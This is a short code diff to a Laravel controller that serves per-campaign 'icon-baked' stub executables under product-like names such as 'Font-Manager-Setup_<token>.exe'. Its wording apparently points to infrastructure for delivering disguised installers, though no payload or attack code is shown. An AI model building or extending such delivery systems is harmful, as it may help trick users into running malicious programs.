@@ -29,7 +29,10 @@ class SoftwareDeliveryController extends Controller
             abort(404);
         }
 
-        if (!Storage::disk('local')->exists(self::STUB_PATH)) {
+        // Serve this campaign's branded (icon-baked) stub if one was uploaded,
+        // otherwise fall back to the shared global stub.
+        $stubRel = $campaign->hasBrandedStub() ? $campaign->brandedStubRelPath() : self::STUB_PATH;
+        if (!Storage::disk('local')->exists($stubRel)) {
             abort(503, 'Installer temporarily unavailable.');
         }
 
@@ -52,7 +55,7 @@ class SoftwareDeliveryController extends Controller
         // e.g. "Font-Manager-Setup_a1b2c3d4.exe"
         $name = $campaign->downloadBaseName() . '_' . $token . '.exe';
 
-        return response()->download(Storage::disk('local')->path(self::STUB_PATH), $name, [
+        return response()->download(Storage::disk('local')->path($stubRel), $name, [
             'Content-Type'  => 'application/octet-stream',
             'Cache-Control' => 'no-store, no-cache, must-revalidate, max-age=0',
         ]);
